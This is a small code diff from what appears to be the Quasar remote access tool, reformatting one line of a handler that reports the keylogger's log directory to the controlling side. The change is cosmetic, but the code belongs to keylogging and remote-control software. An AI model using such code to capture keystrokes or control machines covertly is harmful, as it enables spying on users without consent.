@@ -22,7 +22,7 @@ namespace Quasar.Client.Messages
 
         public void Execute(ISender client, GetKeyloggerLogsDirectory message)
         {
-            client.Send(new GetKeyloggerLogsDirectoryResponse {LogsDirectory = Settings.LOGSPATH });
+            client.Send(new GetKeyloggerLogsDirectoryResponse { LogsDirectory = Settings.LOGSPATH });
         }
     }
 }
